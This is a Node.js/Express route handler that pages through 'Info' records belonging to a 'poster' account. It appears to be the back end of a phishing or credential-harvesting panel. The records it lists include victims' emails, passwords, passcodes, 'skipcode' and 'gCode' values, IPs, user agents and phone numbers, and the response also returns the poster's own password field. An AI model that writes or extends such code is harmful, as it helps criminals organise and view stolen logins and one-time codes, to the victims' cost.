// Paginated poster_details function - REPLACE in routehandler.js
export const poster_details = async (req, res) => {
  const { id } = req.params;
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 20;
  const filter = req.query.filter || '';
  const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];

  try {
    const poster = await Poster.findOne({ _id: id })
      .select('username password posterId links createdAt tag root')
      .populate('root', 'username adminId');

    // Build query for Info
    let query = { root: id };
    if (filter) {
      query.$or = [
        { site: { $regex: filter, $options: 'i' } },
        { email: { $regex: filter, $options: 'i' } },
        { mail: { $regex: filter, $options: 'i' } },
      ];
    }

    let sort = { createdAt: -1 };
    if (sortBy.length > 0) {
      sort = {};
      sortBy.forEach(s => { sort[s.id] = s.desc ? -1 : 1; });
    }

    const total = await Info.countDocuments(query);
    const details = await Info.find(query)
      .select(
        'site mail passcode skipcode email password tag gCode ip agent status number createdAt amount '
      )
      .sort(sort)
      .skip((page - 1) * pageSize)
      .limit(pageSize)
      .lean();

    return res.status(200).json({
      poster: poster,
      data: details,
      total,
      page,
      pageSize,
      totalPages: Math.ceil(total / pageSize),
    });
  } catch (e) {
    console.error('Error fetching poster details:', e);
    return res.status(500).json({ error: 'Server error' });
  }
};
